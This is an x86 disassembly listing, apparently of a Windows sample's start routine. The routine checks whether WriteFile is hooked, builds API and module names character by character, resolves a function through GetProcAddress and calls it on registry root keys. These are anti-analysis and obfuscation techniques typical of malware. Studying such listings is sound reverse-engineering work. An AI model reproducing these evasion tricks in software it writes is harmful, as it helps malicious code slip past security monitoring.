
start:
0x00401770:	pushl	%ebp
0x00401771:	movl	%esp, %ebp
0x00401773:	subl	$0xd8, %esp
0x00401779:	pushl	%ebx
0x0040177a:	pushl	%esi
0x0040177b:	pushl	%edi
0x0040177c:	movl	%ebp, 0x0041d988
0x00401782:	pusha	
0x00401783:	movl	$0x0, -140(%ebp)
0x0040178d:	movl	$0x80000002, -160(%ebp)
0x00401797:	movl	WriteFile@kernel32.dll, %eax
0x0040179c:	movl	%eax, -192(%ebp)
0x004017a2:	movl	$0x40518c, -176(%ebp)
0x004017ac:	movl	$0x4051a0, -188(%ebp)
0x004017b6:	movl	$0x4051b0, -180(%ebp)
0x004017c0:	movl	-192(%ebp), %ecx
0x004017c6:	movzbl	(%ecx), %edx
0x004017c9:	cmpl	$0x55, %edx
0x004017cc:	je	0x004017ed	; targets: 0x004017ed(MAY), 0x004017ce(MAY)
0x004017ce:	movl	-192(%ebp), %eax	; from: 0x004017cc(MAY)
0x004017d4:	movzbl	(%eax), %ecx
0x004017d7:	cmpl	$0x8b, %ecx
0x004017dd:	je	0x004017ed	; targets: 0x004017ed(MAY), 0x004017df(MAY)
0x004017df:	movl	-192(%ebp), %edx	; from: 0x004017dd(MAY)
0x004017e5:	movzbl	(%edx), %eax
0x004017e8:	cmpl	$0x6a, %eax
0x004017eb:	jne	0x0040182a	; targets: 0x004017ed(MAY), 0x0040182a(MAY)
0x004017ed:	movl	$0x61, %ecx	; from: 0x004017eb(MAY), 0x004017dd(MAY), 0x004017cc(MAY)
0x004017f2:	movl	-176(%ebp), %edx
0x004017f8:	movw	%cx, (%edx)
0x004017fb:	movl	$0x61, %eax
0x00401800:	movl	-176(%ebp), %ecx
0x00401806:	movw	%ax, 0x6(%ecx)
0x0040180a:	movl	$0x70, %edx
0x0040180f:	movl	-176(%ebp), %eax
0x00401815:	movw	%dx, 0x8(%eax)
0x00401819:	movl	$0x69, %ecx
0x0040181e:	movl	-176(%ebp), %edx
0x00401824:	movw	%cx, 0xa(%edx)
0x00401828:	jmp	0x0040182c	; targets: 0x0040182c(MAY)
0x0040182a:	int	$0x4	; from: 0x004017eb(MAY)
0x0040182c:	movl	-188(%ebp), %eax	; from: 0x00401828(MAY)
0x00401832:	movb	$0x52, (%eax)
0x00401835:	movl	-188(%ebp), %ecx
0x0040183b:	pushl	%ecx
0x0040183c:	movl	-176(%ebp), %edx
0x00401842:	pushl	%edx
0x00401843:	call	GetModuleHandleW@kernel32.dll	; targets: 0xff000210(MAY)
0x00401849:	pushl	%eax
0x0040184a:	call	GetProcAddress@kernel32.dll	; targets: 0xff0001c0(MAY)
0x00401850:	movl	%eax, 0x0041d990
0x00401855:	movl	$0x53, %eax
0x0040185a:	movl	-180(%ebp), %ecx
0x00401860:	movw	%ax, 0x4(%ecx)
0x00401864:	movl	$0x49, %edx
0x00401869:	movl	-180(%ebp), %eax
0x0040186f:	movw	%dx, 0x6(%eax)
0x00401873:	leal	-184(%ebp), %ecx
0x00401879:	pushl	%ecx
0x0040187a:	movl	-180(%ebp), %edx
0x00401880:	pushl	%edx
0x00401881:	pushl	$0x80000000
0x00401886:	call	0x0041d990	; targets: 0x00000000(MAY)
